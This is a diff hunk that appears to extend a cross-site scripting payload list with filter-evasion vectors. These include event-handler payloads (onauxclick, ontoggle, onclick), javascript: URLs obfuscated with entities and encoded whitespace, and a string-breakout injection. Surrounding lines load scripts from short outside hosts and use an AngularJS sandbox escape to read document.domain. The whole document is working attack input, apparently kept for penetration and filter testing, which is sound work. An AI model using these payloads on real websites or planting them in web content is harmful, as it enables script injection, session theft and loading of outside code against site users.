@@ -6,6 +6,15 @@
 <iframe src=//⑮.rs>
 '"<x/oncut=alert(1)>a
 "<script src=//14.rs>"
+');%0a}%0d}%09alert();/*anything here*/if(true){//anything here%0a('
+<a"/onclick=(confirm)()>click
+<a/href=javascript&colon;alert()>click
+<a/href=&#74;ava%0a%0d%09script&colon;alert()>click
+<d3v/onauxclick=[2].some(confirm)>click
+<d3v/onauxclick=(((confirm)))``>click
+<d3v/onmouseleave=[2].some(confirm)>click
+<details/open/ontoggle=alert()>
+<details/open/ontoggle=(confirm)()//
 {{'tester'.constructor.prototype.charAt=[].join;$eval('test=test} } };alert(document.domain)//');}}
 '-setTimeout`prompt\u0028document.domain\u0029`-'
 -setTimeout`prompt\u0028document.domain\u0029`-
